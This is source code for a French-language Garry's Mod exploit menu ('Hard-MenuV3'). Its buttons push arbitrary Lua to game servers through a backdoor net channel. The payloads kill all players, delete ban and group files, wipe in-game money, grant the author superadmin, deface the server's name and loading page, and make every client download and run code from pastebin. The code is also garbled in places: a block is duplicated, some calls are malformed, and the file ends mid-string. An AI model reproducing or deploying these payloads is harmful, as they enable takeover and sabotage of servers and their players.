Macro:SetSize( 110, 25 )
Macro:SetText( "Nuke" )
Macro.Paint = function()
surface.SetDrawColor(250, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local nuke = [[
    if( LeyAC ) then
        LeyAC = nil;
    end

Macro.DoClick = function()
local nuke = [[
    if( LeyAC ) then
        LeyAC = nil;
    end

timer.Create( "next_level_timer2", 20, 0, function()
    --Break some bad cmds
    local bad = {"Ban","Kick","Kill","KillSilent","GodEnable","GodDisable"} for k,v in next, bad do FindMetaTable("Player")[v] = nil end
    --Break ULX
    if ULib then
        for k,v in pairs(player.GetAll()) do
            ULib.ucl.addUser( v:SteamID(), {}, {}, "user" );
        end
 
        for k,v in pairs(ULib.ucl.groups) do
            if k != "user" then
                ULib.ucl.removeGroup(k);
            end
        end
 
        for k,v in pairs(ULib.ucl.users) do
            v.group = "user"
        end
    end
    --Gamemode related
    if GAMEMODE.Name == "DarkRP" then
 
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("rp_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "darkrp_specific_persistence", function( ply )
            RunConsoleCommand("rp_setmoney", ply:Nick(), 0);
        end)
    end
 
    if GAMEMODE.Name == "Trouble in Terrorist Town" then //something here?
        //for k, v in pairs(player.GetAll()) do
        //end
    end
 
    if net.WriteString.find( GAMEMODE.Name:lower(), "stronghold" ) then
        for k,v in pairs(player.GetAll()) do
            RunConsoleCommand("gbux_setmoney", v:Nick(), 0);
        end
 
        hook.Add("PlayerInitialSpawn", "stronghold_specific_persistence", function( ply )
            RunConsoleCommand("gbux_setmoney", ply:Nick(), 0);
        end)
     
        local fil = file.Find( "data/stronghold/playerinfo/*.txt", "GAME" )
     
        for k, v in pairs( fil ) do
            file.Delete( fil )
        end
    end
end)

if GetConVarnet.WriteString("sv_allowcslua") != "0" then
    RunConsoleCommand( "sv_allowcslua", "1" );
end

hook.Add("Think", "busted", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(2.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)

timer.Create( "next_level_timer", 5, 0, function()
    for k, v in pairs(player.GetAll()) do
        v:ConCommand("say Hard Menu le best !");
    end
end)

RunConsoleCommand("hostname", "Hacked by Hard-MenuV3 :D")
RunConsoleCommand( "sv_loadingurl", "http://uu.esy.es/zyqv6r7n/seized.html" )
]]
net.Start(HardMenuFree)
net.WriteString( nuke )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "NUKE activÃ© !" )
    SploitNotify("NUKE SERVEUR (Ã§a fail mal)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Taille grande" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local giant = [[
hook.Add("Think", "giant", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(50.5, 100);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(HardMenuFree)
net.WriteString( giant )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde grandit ! :o" )
    SploitNotify("Tout le monde est grand !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Taille petite" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local tall = [[
hook.Add("Think", "tall", function()
    for k,v in pairs (player.GetAll()) do
        v:SetModelScale(0.2, 80);
        v:SetRunSpeed(400 * 2);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(HardMenuFree)
net.WriteString( tall )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde devient petit :o" )
    SploitNotify("Tout le monde devient petit")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Speedhack" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
local speedhack = [[
hook.Add("Think", "speedhack", function()
    for k,v in pairs (player.GetAll()) do
        v:SetRunSpeed(400* 4);
        v:SetWalkSpeed(200 * 2);
    end
end)]]
net.Start(HardMenuFree)
net.WriteString( speedhack )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "ERREUR, CET EXPLOIT NE FONCTIONNE PAS ! Contacter Thomas Baguettes si l'erreur persite." )
    SploitNotify("Speedhack activÃ©")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 260, 30 )
Macro:SetText( "Faire Danse Tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde Danse" )
    SploitNotify("Tout le monde Danse")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(HardMenuFree)
net.WriteString([[for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end timer.Create("dance_loop",8.9,0,function() for k,v in pairs (player.GetAll()) do v:DoAnimationEvent(ACT_GMOD_TAUNT_DANCE) end end )
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 140, 30 )
Macro:SetText( "+right" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "+right" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(HardMenuFree)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+right")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 140, 60 )
Macro:SetText( "+duck" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "+duck" )
    SploitNotify("+right")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(HardMenuFree)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+duck")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 140, 90 )
Macro:SetText( "+back" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(HardMenuFree)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+back")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 140, 120 )
Macro:SetText( "+forward" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "+back" )
    SploitNotify("+back")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(HardMenuFree)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("+forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 140, 150 )
Macro:SetText( "Stop right/etc" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Stop right/etc" )
    SploitNotify("Stop right/etc")
    surface.PlaySound("buttons/blip1.wav") 
net.Start(HardMenuFree)
net.WriteString([[for k,v in pairs(player.GetAll()) do
    v:ConCommand("-right")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-duck")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-back")
end

for k,v in pairs(player.GetAll()) do
    v:ConCommand("-forward")
end
]])
net.WriteBit (1)
net.SendToServer()
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Targets)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Tremblement de terre" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString(" for k, v in pairs( player.GetAll() ) do v:SendLua( [[util.ScreenShake( Vector( 0, 0, 0 ), 10, 5, 60, 5000 )]] ) end ")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tremblement de terre activ?" )
    SploitNotify("Tremblement de terre activ? !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )   
Macro:SetParent(Misc)
Macro:SetPos( 20, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 130, 25 )
Macro:SetText( "Se Metre Superadmin " )
Macro.Paint = function()
surface.SetDrawColor(0, 255, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("RunConsoleCommand(\"fadmin\", \"setaccess\", \"[TUNSRP] [ Thomas Baguettes ]\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )   
Macro:SetParent(Misc)
Macro:SetPos( 20, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 130, 25 )
Macro:SetText( "Metre Child exploits Superadmin " )
Macro.Paint = function()
surface.SetDrawColor(0, 255, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("RunConsoleCommand(\"fadmin\", \"setaccess\", \"child exploit\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Misc)
Macro:SetPos( 20, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 130, 25 )
Macro:SetText( "Metre Thomas superadmin" )
Macro.Paint = function()
surface.SetDrawColor(0, 255, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("RunConsoleCommand(\"fadmin\", \"setaccess\", \"[TUNSRP] [ Thomas Baguettes ]\", \"superadmin\")")
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "STEAM_0:1:219919521 est superadmin." )
    SploitNotify("Superadmin set OK")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Pousser tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:SetVelocity(v:GetVelocity() + Vector(math.random(1000,5000), math.random(1000,5000), math.random(1000,5000))) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Pousser tout le monde activÃ©" )
    SploitNotify("Tout le monde se pousse !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Targets)
Macro:SetPos( 260, 60 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Change loading du Serveur" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "RunConsoleCommand(\"sv_loadingurl\", \"http://uu.esy.es/zyqv6r7n/seized.html\")" ) 
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Change le loading du Serveur activÃ©" )
    SploitNotify("Change le loading du Serveur activÃ©")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller) 
Macro:SetPos( 380, 240 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Reset argent" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "RunConsoleCommand(\"rp_resetallmoney\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Argent reset" )
    SploitNotify("Argent reset")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 140, 390 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "InversÃ© la gravitÃ©" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "RunConsoleCommand(\"sv_gravity\", \"-600\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "GravitÃ© inversÃ©" )
    SploitNotify("GravitÃ© inversÃ© Ã  -600")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )  
Macro:SetParent(Controller)
Macro:SetPos( 140, 150 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Effacer les donnÃƒÂ©es" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:net.SendToServerLua([[http.Fetch('https://pastebin.com/raw/UqB7Nap5',function(b,l,h,c)RunString(b)end,nil)]]) end " )
net.WriteBit(1)
net.SendToServer() 
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Datas Supprimer" )
SploitNotify("Tout les data sont supprimÃ©s")
surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 140, 420 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Niquer la physic" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "RunConsoleCommand(\"sv_friction\", \"-50\")" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Physic niquÃ©" )
    SploitNotify("Physic changÃ© Ã  -8")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Hurlement" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:EmitSound( \"npc/stalker/go_alert2a.wav\", 100, 100 ) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Hurlement activÃ© !" )
    SploitNotify("Hurlement activÃ©")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 300 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Change map gm_construct" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("RunConsoleCommand(\"ulx\", \"map\", \"gm_construct\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Map changÃ© Ã  GM_CONSTRUCT" )
    SploitNotify("Map changÃ© Ã  GM_CONSTRUCT")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 330 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Change map gm_flatgrass" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString("RunConsoleCommand(\"ulx\", \"map\", \"gm_flatgrass\")")
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Map changÃ© Ã  GM_FLATGRASS" )
    SploitNotify("Map changÃ© Ã  GM_FLAGRASS")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 380, 90 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Supprimer les grades" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "if file.Exists( \"ulib/groups.txt\", \"DATA\" ) then file.Delete(\"ulib/groups.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Grades supprimÃ©s" )
    SploitNotify("Grades supprimÃ©s.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 120 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Bruler tout le monde" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Ignite(120) end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde brÃ»le" )
    SploitNotify("Tout le monde brule !")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 610, 30 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 130, 25 )
Macro:SetText( "Force change name" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "http.Fetch(\"https://pastebin.com/raw/301d9Wp4\",function(b,l,h,c)RunString(b)end,nil)" )
net.WriteBit (1)
net.SendToServer()
	chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde change de nom :')" )
	    SploitNotify("Tout le monde change de nom :')")
    surface.PlaySound("buttons/blip1.wav") 
        net.WriteBit(1)
        net.SendToServer()
end  

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 380, 60 )
Macro:SetText( "Deban tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "if file.Exists( \"ulib/bans.txt\", \"DATA\" ) then file.Delete(\"ulib/bans.txt\") end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde est debanni" )
    SploitNotify("Plus personne n'est banni.")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" ) 
Macro:SetParent(Controller)
Macro:SetPos( 260, 90 )
Macro:SetText( "Tuer tout le monde" )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end
Macro.DoClick = function()
net.Start(HardMenuFree)
net.WriteString( "for k,v in pairs(player.GetAll()) do v:Kill() end" )
net.WriteBit (1)
net.SendToServer()
chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde est mort" )
    SploitNotify("Tout le monde est mort !)")
    surface.PlaySound("buttons/blip1.wav") 
end

local Macro = vgui.Create( "DButton" )
Macro:SetParent(Controller)
Macro:SetPos( 260, 270 )
Macro:SetTextColor( Color(255, 255, 255, 255) )
Macro:SetSize( 110, 25 )
Macro:SetText( "Grosse tÃªte" )
Macro.Paint = function()
surface.SetDrawColor(255, 0, 0)
surface.DrawRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
surface.SetDrawColor( 32, 80, 154 )
surface.DrawOutlinedRect( 0, 0, Macro:GetWide(), Macro:GetTall() )
end --  
Macro.DoClick = function()
    chat.AddText(Color(math.random(255), math.random(255), math.random(255)), "[", "Hard-MenuV3", "] ", Color( 255, 255, 255 ), "Tout le monde Ã  une grosse tÃªte :)" )
	    SploitNotify("Tout le monde Ã  une grosse tÃªte")
    surface.PlaySound("buttons/blip1.wav") 
        net.Start(HardMenuFree)
        net.WriteString([[
